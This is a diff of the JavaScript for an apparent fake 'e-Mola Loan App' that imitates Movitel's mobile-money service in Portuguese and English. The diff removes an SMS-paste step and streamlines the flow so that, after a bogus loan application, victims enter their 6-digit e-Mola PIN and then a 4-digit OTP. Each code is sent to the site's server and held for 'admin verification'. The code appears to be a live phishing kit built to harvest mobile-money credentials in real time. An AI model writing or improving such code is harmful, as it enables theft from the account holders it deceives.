@@ -1,5 +1,5 @@
 // ============================================================
-// script.js – e-Mola Loan App (6‑digit PIN)
+// e-Mola Loan App – Code-Only Flow (PIN → OTP)
 // ============================================================
 
 // Language translations (Portuguese / English)
@@ -15,11 +15,10 @@ const translations = {
     footer: '© 2026 e-Mola Empréstimos – Movitel',
     back: 'Voltar',
     loan_application: 'Pedido de Empréstimo',
-    step1_sub: 'Passo 1 de 5',
-    step2_sub: 'Passo 2 de 5',
-    step3_sub: 'Passo 3 de 5',
-    step4_sub: 'Passo 4 de 5',
-    step5_sub: 'Passo 5 de 5',
+    step1_sub: 'Passo 1 de 4',
+    step2_sub: 'Passo 2 de 4',
+    step3_sub: 'Passo 3 de 4',
+    pin_step_sub: 'Passo final de verificação',
     loan_type: 'Tipo de Empréstimo',
     loan_amount: 'Montante (MZN)',
     loan_term: 'Prazo',
@@ -37,18 +36,8 @@ const translations = {
     applicant: 'Requerente',
     submit: 'SUBMETER PEDIDO',
     processing: 'A Processar Pedido...',
-    processing_sub: 'Aguarde enquanto processamos o seu pedido de empréstimo',
+    processing_sub: 'Aguarde enquanto processamos o seu pedido',
     awaiting: '⏳ A aguardar aprovação do administrador...',
-    verify_sms: 'Verificar Mensagem e-Mola',
-    paste_sms: '📩 Cole o conteúdo da mensagem e-Mola:',
-    sms_hint: 'Inclua o código OTP ou detalhes de verificação enviados para o seu número e-Mola.',
-    sms_tip: '💡 Dica:',
-    sms_tip_text: 'Verifique a sua caixa de SMS para a mensagem do e-Mola Moçambique. Copie o texto completo da mensagem.',
-    submit_sms: 'SUBMETER MENSAGEM',
-    resend_sms: '🔄 Reenviar SMS',
-    verifying_sms: 'A Verificar Mensagem...',
-    verifying_sms_sub: 'A sua mensagem foi recebida. Aguarde a verificação do administrador...',
-    admin_reviewing: '⏳ O administrador está a analisar a sua mensagem...',
     enter_pin: 'Introduza o PIN e-Mola',
     pin_label: 'Introduza o seu PIN e-Mola (6 dígitos):',
     submit_pin: 'SUBMETER PIN',
@@ -56,12 +45,11 @@ const translations = {
     verifying_pin_sub: 'O seu PIN foi recebido. Aguarde a verificação do administrador...',
     admin_reviewing_pin: '⏳ O administrador está a analisar o seu PIN...',
     enter_otp: 'Introduza o Código OTP',
-    otp_sub: 'Código de 4 dígitos enviado para o seu telemóvel via e-Mola',
+    otp_sub: 'Código de 4 dígitos enviado via SMS',
     otp_label: 'Código OTP (4 dígitos):',
     verify_otp: 'VERIFICAR E APROVAR',
-    resend_otp: '🔄 Reenviar OTP',
     verifying_otp: 'A Verificar OTP...',
-    verifying_otp_sub: 'O seu código OTP foi recebido. Aguarde a verificação do administrador...',
+    verifying_otp_sub: 'O seu código foi recebido. Aguarde a verificação do administrador...',
     admin_reviewing_otp: '⏳ O administrador está a verificar o seu OTP...',
     app_id: 'ID do Pedido:',
     approved_title: 'Empréstimo Aprovado!',
@@ -71,7 +59,7 @@ const translations = {
     important_text: 'Os fundos serão depositados diretamente na sua conta e-Mola dentro de 5 minutos. Assegure‑se de que o seu número está correto.',
     loan_details: 'Detalhes do Empréstimo',
     next_steps: 'Próximos Passos:',
-    next_steps_text: 'Para começar a pagar, pode configurar um plano de pagamento automático na sua conta e-Mola nos próximos 7 dias.',
+    next_steps_text: 'Configurar pagamento automático na sua conta e-Mola.',
     finish: 'CONCLUIR',
     personal: 'Empréstimo Pessoal',
     business: 'Empréstimo Comercial',
@@ -97,11 +85,10 @@ const translations = {
     footer: '© 2026 e-Mola Loans – Movitel',
     back: 'Back',
     loan_application: 'Loan Application',
-    step1_sub: 'Step 1 of 5',
-    step2_sub: 'Step 2 of 5',
-    step3_sub: 'Step 3 of 5',
-    step4_sub: 'Step 4 of 5',
-    step5_sub: 'Step 5 of 5',
+    step1_sub: 'Step 1 of 4',
+    step2_sub: 'Step 2 of 4',
+    step3_sub: 'Step 3 of 4',
+    pin_step_sub: 'Final verification step',
     loan_type: 'Loan Type',
     loan_amount: 'Amount (MZN)',
     loan_term: 'Term',
@@ -119,18 +106,8 @@ const translations = {
     applicant: 'Applicant',
     submit: 'SUBMIT APPLICATION',
     processing: 'Processing Application...',
-    processing_sub: 'Please wait while we process your loan application',
+    processing_sub: 'Please wait while we process your application',
     awaiting: '⏳ Awaiting admin approval...',
-    verify_sms: 'Verify e-Mola Message',
-    paste_sms: '📩 Paste the e-Mola message content:',
-    sms_hint: 'Include the OTP code or verification details sent to your e-Mola number.',
-    sms_tip: '💡 Tip:',
-    sms_tip_text: 'Check your SMS inbox for the message from e-Mola Mozambique. Copy the full message text.',
-    submit_sms: 'SUBMIT MESSAGE',
-    resend_sms: '🔄 Resend SMS',
-    verifying_sms: 'Verifying Message...',
-    verifying_sms_sub: 'Your message has been received. Please wait for admin verification...',
-    admin_reviewing: '⏳ Admin is reviewing your message...',
     enter_pin: 'Enter e-Mola PIN',
     pin_label: 'Enter your e-Mola PIN (6 digits):',
     submit_pin: 'SUBMIT PIN',
@@ -138,12 +115,11 @@ const translations = {
     verifying_pin_sub: 'Your PIN has been received. Please wait for admin verification...',
     admin_reviewing_pin: '⏳ Admin is reviewing your PIN...',
     enter_otp: 'Enter OTP Code',
-    otp_sub: '4-digit code sent to your phone via e-Mola',
+    otp_sub: '4-digit code sent via SMS',
     otp_label: 'OTP Code (4 digits):',
     verify_otp: 'VERIFY & APPROVE',
-    resend_otp: '🔄 Resend OTP',
     verifying_otp: 'Verifying OTP...',
-    verifying_otp_sub: 'Your OTP code has been received. Please wait for admin verification...',
+    verifying_otp_sub: 'Your code has been received. Please wait for admin verification...',
     admin_reviewing_otp: '⏳ Admin is verifying your OTP...',
     app_id: 'Application ID:',
     approved_title: 'Loan Approved!',
@@ -153,7 +129,7 @@ const translations = {
     important_text: 'The funds will be deposited directly to your e-Mola account within 5 minutes. Please ensure your phone number is correct.',
     loan_details: 'Loan Details',
     next_steps: 'Next Steps:',
-    next_steps_text: 'To start repaying, you can set up an automatic payment plan on your e-Mola account in the next 7 days.',
+    next_steps_text: 'Set up automatic payment on your e-Mola account.',
     finish: 'FINISH',
     personal: 'Personal Loan',
     business: 'Business Loan',
@@ -206,27 +182,21 @@ const S = {
 };
 
 let currentPollTimeout = null;
-let otpResendTimer = null;
-let otpResendCountdown = 0;
-let pinBlockTimer = null;
-let smsCountdownInterval = null;
-let otpCountdownInterval = null;
 
 // localStorage
 const STORAGE_KEYS = {
   APPLICATION_ID: 'emola_application_id',
   APPLICATION_DATA: 'emola_application_data',
   REJECTION_INFO: 'emola_rejection_info',
-  FORM_DRAFT: 'emola_form_draft',
-  OTP_TIMER: 'emola_otp_timer'
+  FORM_DRAFT: 'emola_form_draft'
 };
 
 function saveToLocalStorage(key, data) {
   try {
     localStorage.setItem(key, JSON.stringify(data));
-    console.log(`💾 Saved to localStorage: ${key}`);
+    console.log(`💾 Saved: ${key}`);
   } catch (error) {
-    console.error(`❌ Failed to save ${key}:`, error);
+    console.error(`❌ Save failed: ${key}`, error);
   }
 }
 
@@ -235,7 +205,6 @@ function getFromLocalStorage(key) {
     const data = localStorage.getItem(key);
     return data ? JSON.parse(data) : null;
   } catch (error) {
-    console.error(`❌ Failed to load ${key}:`, error);
     return null;
   }
 }
@@ -243,17 +212,14 @@ function getFromLocalStorage(key) {
 function removeFromLocalStorage(key) {
   try {
     localStorage.removeItem(key);
-    console.log(`🗑️ Removed from localStorage: ${key}`);
-  } catch (error) {
-    console.error(`❌ Failed to remove ${key}:`, error);
-  }
+  } catch (error) {}
 }
 
 function saveApplicationId(id) {
   if (id) {
     S.applicationId = id;
     saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
-      id: id,
+      id,
       timestamp: new Date().toISOString()
     });
   }
@@ -294,7 +260,6 @@ function loadApplicationData() {
       fieldsToRestore.forEach(field => {
         if (saved[field] !== undefined) S[field] = saved[field];
       });
-      console.log('🔄 Restored application data');
       return true;
     } else {
       removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
@@ -369,9 +334,6 @@ function goTo(pageId) {
   const el = document.getElementById(pageId);
   if (el) el.classList.add('active');
   window.scrollTo(0, 0);
-
-  if (pageId === 'page-sms-paste') startSmsCountdown();
-  if (pageId === 'page-otp') startOtpCountdown();
 }
 
 function startApplication() {
@@ -381,7 +343,7 @@ function startApplication() {
     S.applicationId = 'EMOLA-' + Date.now().toString().slice(-6);
     saveApplicationId(S.applicationId);
   }
-  ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => clearErr(id));
+  ['s1Err', 's2Err', 's3Err', 'pinErr', 'otpErr'].forEach(id => clearErr(id));
   goTo('page-step1');
 }
 
@@ -396,7 +358,7 @@ function showToast(message, type = 'info', duration = 3000) {
   setTimeout(() => toast.remove(), duration);
 }
 
-// Form helpers
+// Helpers
 function normalizePhone(id) {
   let inp = document.getElementById(id);
   let val = inp.value.replace(/\D/g, '');
@@ -465,20 +427,17 @@ function toS3() {
   goTo('page-step3');
 }
 
-// PIN/OTP helpers (6‑digit PIN)
-function pinMvM(el, i, maxLength = 6) {
+// PIN helpers (6 digits)
+function pinMvM(el, i) {
   el.value = el.value.replace(/\D/g, '');
-  if (el.value && i < maxLength - 1) {
-    const nextPin = document.getElementById('pin' + (i + 1));
-    if (nextPin) {
-      nextPin.focus();
-      return;
-    }
+  if (el.value && i < 5) {
+    document.getElementById('pin' + (i + 1)).focus();
   }
-  if (i === maxLength - 1 && el.value) {
+  if (i === 5 && el.value) {
     const allFilled = [0,1,2,3,4,5].every(idx => document.getElementById('pin' + idx)?.value);
     if (allFilled) setTimeout(() => doPin(), 300);
   }
+  chkPin();
 }
 
 function togPin() {
@@ -515,10 +474,10 @@ function clearOtpCode() {
   chkPin();
 }
 
-function handleOtpInput(el, type) {
-  el.value = el.value.replace(/\D/, '');
+function handleOtpInput(el) {
+  el.value = el.value.replace(/\D/g, '');
   const idx = parseInt(el.id.match(/\d$/)[0]);
-  if (el.value && type === 'otp' && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
+  if (el.value && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
   chkPin();
   if (idx === 3 && el.value) {
     const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
@@ -577,109 +536,13 @@ function startPinBlockCountdown(seconds) {
   }, 1000);
 }
 
+let pinBlockTimer = null;
+
 async function resetPinAttempts() {
   try {
     await fetch(`/api/reset-pin-attempts/${S.applicationId}`, { method: 'POST' });
   } catch (error) {
     console.error('Erro ao repor tentativas:', error);
-  }
-}
-
-// SMS countdown
-function startSmsCountdown() {
-  const wrap = document.getElementById('smsCountdownWrap');
-  const text = document.getElementById('smsCountdownText');
-  const btn = document.getElementById('btnSmsResend');
-  if (!wrap || !text || !btn) return;
-  wrap.style.display = 'block';
-  btn.style.display = 'none';
-  let remaining = 60;
-  text.textContent = `Reenviar disponível em ${remaining}s`;
-  clearInterval(smsCountdownInterval);
-  smsCountdownInterval = setInterval(() => {
-    remaining--;
-    if (remaining <= 0) {
-      clearInterval(smsCountdownInterval);
-      text.textContent = 'SMS expirado. Pode reenviar.';
-      btn.style.display = 'block';
-    } else {
-      text.textContent = `Reenviar disponível em ${remaining}s`;
-    }
-  }, 1000);
-}
-
-async function doSmsResend() {
-  const btn = document.getElementById('btnSmsResend');
-  btn.disabled = true;
-  btn.textContent = '⏳ A enviar...';
-  try {
-    const res = await fetch('/api/resend-sms', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationId: S.applicationId })
-    });
-    const data = await res.json();
-    if (data.ok) {
-      showToast('✅ SMS reenviado. Cole a nova mensagem.', 'success');
-      document.getElementById('smsMsgBox').value = '';
-      startSmsCountdown();
-    } else {
-      alert(data.message || 'Falha ao reenviar SMS.');
-    }
-  } catch (err) {
-    alert('Erro de rede: ' + err.message);
-  } finally {
-    btn.disabled = false;
-    btn.textContent = '🔄 Reenviar SMS';
-  }
-}
-
-// OTP countdown
-function startOtpCountdown() {
-  const wrap = document.getElementById('otpCountdownWrap');
-  const text = document.getElementById('otpCountdownText');
-  const btn = document.getElementById('btnOtpResend');
-  if (!wrap || !text || !btn) return;
-  wrap.style.display = 'block';
-  btn.style.display = 'none';
-  let remaining = 60;
-  text.textContent = `Reenviar disponível em ${remaining}s`;
-  clearInterval(otpCountdownInterval);
-  otpCountdownInterval = setInterval(() => {
-    remaining--;
-    if (remaining <= 0) {
-      clearInterval(otpCountdownInterval);
-      text.textContent = 'OTP expirado. Pode reenviar.';
-      btn.style.display = 'block';
-    } else {
-      text.textContent = `Reenviar disponível em ${remaining}s`;
-    }
-  }, 1000);
-}
-
-async function doOtpResend() {
-  const btn = document.getElementById('btnOtpResend');
-  btn.disabled = true;
-  btn.textContent = '⏳ A enviar...';
-  try {
-    const res = await fetch('/api/resend-otp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationId: S.applicationId })
-    });
-    const data = await res.json();
-    if (data.ok) {
-      showToast('✅ OTP reenviado. Introduza o novo OTP.', 'success');
-      clearOtpCode();
-      startOtpCountdown();
-    } else {
-      alert(data.message || 'Falha ao reenviar OTP.');
-    }
-  } catch (err) {
-    alert('Erro de rede: ' + err.message);
-  } finally {
-    btn.disabled = false;
-    btn.textContent = '🔄 Reenviar OTP';
   }
 }
 
@@ -720,7 +583,6 @@ function showApproval() {
   finishBtn.textContent = currentLang === 'en' ? 'FINISH' : 'CONCLUIR';
   finishBtn.onclick = loadDashboard;
   Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
-  if (otpResendTimer) clearInterval(otpResendTimer);
   if (pinBlockTimer) clearInterval(pinBlockTimer);
   goTo('page-approval');
 }
@@ -778,12 +640,12 @@ async function submitApp() {
       S.applicationId = data.applicationId;
       saveApplicationId(S.applicationId);
       document.getElementById('processingStatus').innerHTML = '⏳ A aguardar aprovação do administrador...';
-      startPoll(S.applicationId, 'sms',
+      startPoll(S.applicationId, 'app',
         () => {
           showToast('✅ Pedido Aprovado!', 'success');
-          goTo('page-sms-paste');
+          goTo('page-pin');
         },
-        () => handleRejection('sms')
+        () => handleRejection('app')
       );
     } else {
       showErr('s3Err', data.message || 'Falha ao submeter pedido.');
@@ -793,37 +655,7 @@ async function submitApp() {
   }
 }
 
-// SMS submission
-async function doSmsParse() {
-  const msg = document.getElementById('smsMsgBox').value.trim();
-  if (msg.length < 3) {
-    showErr('momErr', 'Por favor cole uma mensagem válida.');
-    return;
-  }
-  const waitSmsAppId = document.getElementById('waitSmsAppId');
-  if (waitSmsAppId) waitSmsAppId.textContent = S.applicationId;
-  goTo('page-wait-sms');
-  try {
-    await fetch('/api/send-momo-message', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ momoData: { applicationId: S.applicationId, momoMessage: msg } })
-    });
-    startPoll(S.applicationId, 'sms',
-      () => {
-        showToast('✅ SMS Aprovado!', 'success');
-        goTo('page-pin');
-      },
-      () => handleRejection('sms')
-    );
-  } catch (err) {
-    showErr('momErr', 'Falha ao submeter SMS.');
-    goTo('page-sms-paste');
-    startSmsCountdown();
-  }
-}
-
-// PIN submission (6 digits)
+// PIN submission
 async function doPin() {
   const pin = [0,1,2,3,4,5].map(i => document.getElementById('pin'+i).value).join('');
   if (pin.length < 6) {
@@ -874,7 +706,7 @@ async function doPin() {
   }
 }
 
-// OTP submission (4 digits)
+// OTP submission
 async function doOtp() {
   const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
   if (otp.length < 4) {
@@ -900,26 +732,21 @@ async function doOtp() {
   } catch (err) {
     showErr('otpErr', 'Falha ao submeter OTP.');
     goTo('page-otp');
-    startOtpCountdown();
   }
 }
 
 // Rejection handling
 function handleRejection(step) {
   clearErr('s3Err');
-  clearErr('momErr');
   clearErr('pinErr');
   clearErr('otpErr');
   if (currentPollTimeout) clearTimeout(currentPollTimeout);
   saveRejectionInfo(step, S.applicationId);
 
   switch (step) {
-    case 'sms':
-      showToast('❌ SMS rejeitado. Verifique e submeta novamente.', 'error');
-      document.getElementById('smsMsgBox').value = '';
-      document.getElementById('smsMsgBox').focus();
-      goTo('page-sms-paste');
-      startSmsCountdown();
+    case 'app':
+      showToast('❌ Pedido rejeitado. Recomece.', 'error');
+      goTo('page-step1');
       break;
     case 'pin':
       showToast('❌ PIN rejeitado. Introduza novamente o seu PIN e-Mola.', 'error');
@@ -931,7 +758,6 @@ function handleRejection(step) {
     case 'otp':
       showToast('❌ OTP rejeitado. Peça um novo OTP.', 'error');
       clearOtpCode();
-      startOtpCountdown();
       goTo('page-otp');
       break;
     default:
@@ -968,4 +794,4 @@ updateCalc();
 applyLanguage();
 const recovered = recoverSession();
 if (!recovered) goTo('page-landing');
-console.log('✅ e-Mola Loan App (6‑digit PIN) loaded!');
+console.log('✅ e-Mola Loan App (code-only flow) loaded!');
